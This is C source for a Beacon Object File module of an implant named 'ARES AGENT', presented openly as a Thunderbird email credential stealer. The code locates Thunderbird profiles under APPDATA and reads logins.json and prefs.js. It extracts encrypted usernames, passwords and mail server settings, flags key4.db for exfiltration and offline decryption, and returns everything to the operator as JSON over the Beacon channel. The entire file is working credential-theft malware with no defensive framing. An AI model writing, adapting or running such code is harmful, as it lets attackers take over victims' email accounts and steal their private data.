/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — BOF Module: Thunderbird Email Credential Stealer
 *
 *  Steals saved email credentials from Mozilla Thunderbird:
 *    - logins.json (encrypted passwords)
 *    - cert9.db + key4.db (NSS database)
 *    - prefs.js (account settings: SMTP/IMAP server info)
 *
 *  Thunderbird uses the same NSS encryption as Firefox.
 *  If no master password is set, credentials are decryptable
 *  with an empty password via PK11SDR_Decrypt.
 *
 *  Output: JSON with email accounts + encrypted credentials
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* ── Read file into heap ── */
static char* _read_file(const char* path, DWORD* out_sz) {
    HANDLE hf = CreateFileA(path, GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == 0 || sz > 5*1024*1024) { CloseHandle(hf); return NULL; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(hf); return NULL; }
    DWORD rd; ReadFile(hf, buf, sz, &rd, NULL);
    CloseHandle(hf);
    buf[rd] = '\0';
    *out_sz = rd;
    return buf;
}

/* ── Extract JSON string value (minimal parser) ── */
static int json_str(const char* json, const char* key, char* out, int max) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    char* p = strstr(json, pattern);
    if (!p) return 0;
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == ':' || *p == '"')) p++;
    int i = 0;
    while (*p && *p != '"' && i < max - 1) {
        if (*p == '\\' && *(p+1)) { p++; } /* skip escape */
        out[i++] = *p++;
    }
    out[i] = '\0';
    return i;
}

/* ── Extract email server info from prefs.js ── */
static int extract_pref(const char* prefs, const char* pref_name, char* out, int max) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "user_pref(\"%s\"", pref_name);
    char* p = strstr(prefs, pattern);
    if (!p) return 0;
    p = strchr(p, ',');
    if (!p) return 0;
    p++; /* skip comma */
    while (*p == ' ' || *p == '"') p++;
    int i = 0;
    while (*p && *p != '"' && *p != ')' && i < max - 1) out[i++] = *p++;
    out[i] = '\0';
    return i;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0) {
        BeaconPrintf(0, "ERROR: cannot get APPDATA");
        return;
    }

    /* Find Thunderbird profiles */
    char profiles_ini[MAX_PATH];
    snprintf(profiles_ini, MAX_PATH, "%s\\Thunderbird\\profiles.ini", appdata);

    DWORD ini_sz = 0;
    char* ini = _read_file(profiles_ini, &ini_sz);
    if (!ini) {
        BeaconPrintf(0, "[*] Thunderbird not found");
        return;
    }

    char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    if (!json) { HeapFree(GetProcessHeap(), 0, ini); return; }

    int off = 0;
    int total = 0;
    off += snprintf(json + off, 65536 - off,
        "{\"type\":\"email_credentials\",\"source\":\"Thunderbird\",\"accounts\":[");

    /* Parse profiles.ini for profile paths */
    char* line = ini;
    while (line && *line) {
        char* next = strchr(line, '\n');
        if (next) { *next = '\0'; next++; }

        /* Look for Path= lines */
        if (strncmp(line, "Path=", 5) == 0) {
            char* profile_rel = line + 5;
            /* Trim \r */
            char* cr = strchr(profile_rel, '\r');
            if (cr) *cr = '\0';

            char profile_dir[MAX_PATH];
            /* Check if relative or absolute */
            if (profile_rel[0] == '/' || (profile_rel[1] == ':')) {
                snprintf(profile_dir, MAX_PATH, "%s", profile_rel);
            } else {
                snprintf(profile_dir, MAX_PATH, "%s\\Thunderbird\\%s", appdata, profile_rel);
                /* Replace / with \ */
                for (char* c = profile_dir; *c; c++) if (*c == '/') *c = '\\';
            }

            /* Read logins.json */
            char logins_path[MAX_PATH + 64];
            snprintf(logins_path, sizeof(logins_path), "%s\\logins.json", profile_dir);

            DWORD lj_sz = 0;
            char* logins_json = _read_file(logins_path, &lj_sz);

            /* Read prefs.js for server settings */
            char prefs_path[MAX_PATH + 64];
            snprintf(prefs_path, sizeof(prefs_path), "%s\\prefs.js", profile_dir);
            DWORD pref_sz = 0;
            char* prefs = _read_file(prefs_path, &pref_sz);

            /* Extract email settings from prefs.js */
            char smtp_host[256] = {0}, imap_host[256] = {0}, email[256] = {0};
            if (prefs) {
                extract_pref(prefs, "mail.smtpserver.smtp1.hostname", smtp_host, sizeof(smtp_host));
                extract_pref(prefs, "mail.server.server1.hostname", imap_host, sizeof(imap_host));
                extract_pref(prefs, "mail.identity.id1.useremail", email, sizeof(email));
            }

            /* Parse logins.json entries */
            if (logins_json) {
                char* entry = logins_json;
                while ((entry = strstr(entry, "\"hostname\"")) != NULL && off < 64000) {
                    char hostname[256] = {0}, enc_user[1024] = {0}, enc_pass[1024] = {0};
                    json_str(entry, "hostname", hostname, sizeof(hostname));
                    json_str(entry, "encryptedUsername", enc_user, sizeof(enc_user));
                    json_str(entry, "encryptedPassword", enc_pass, sizeof(enc_pass));

                    if (hostname[0]) {
                        if (total > 0) off += snprintf(json + off, 65536 - off, ",");
                        off += snprintf(json + off, 65536 - off,
                            "{\"hostname\":\"%s\",\"email\":\"%s\","
                            "\"smtp\":\"%s\",\"imap\":\"%s\","
                            "\"enc_user\":\"%s\",\"enc_pass\":\"%s\","
                            "\"profile\":\"%s\"}",
                            hostname, email, smtp_host, imap_host,
                            enc_user, enc_pass, profile_rel);
                        total++;
                    }
                    entry++;
                }
                memset(logins_json, 0, lj_sz);
                HeapFree(GetProcessHeap(), 0, logins_json);
            }

            if (prefs) {
                memset(prefs, 0, pref_sz);
                HeapFree(GetProcessHeap(), 0, prefs);
            }

            /* Also note key database files for offline cracking */
            char key4_path[MAX_PATH + 64];
            snprintf(key4_path, sizeof(key4_path), "%s\\key4.db", profile_dir);
            DWORD k4_attr = GetFileAttributesA(key4_path);
            if (k4_attr != INVALID_FILE_ATTRIBUTES) {
                /* key4.db exists — can be exfiltrated for offline NSS decrypt */
                if (total > 0 && off < 64000)
                    off += snprintf(json + off, 65536 - off,
                        ",{\"hostname\":\"[key4.db]\",\"path\":\"%s\","
                        "\"note\":\"NSS key database - exfiltrate for offline decrypt\"}",
                        key4_path);
            }
        }

        line = next;
    }

    off += snprintf(json + off, 65536 - off, "],\"total\":%d}", total);

    BeaconOutput(0, json, off);
    BeaconPrintf(0, "\n[+] Thunderbird steal complete: %d accounts", total);

    HeapFree(GetProcessHeap(), 0, json);
    memset(ini, 0, ini_sz);
    HeapFree(GetProcessHeap(), 0, ini);
}
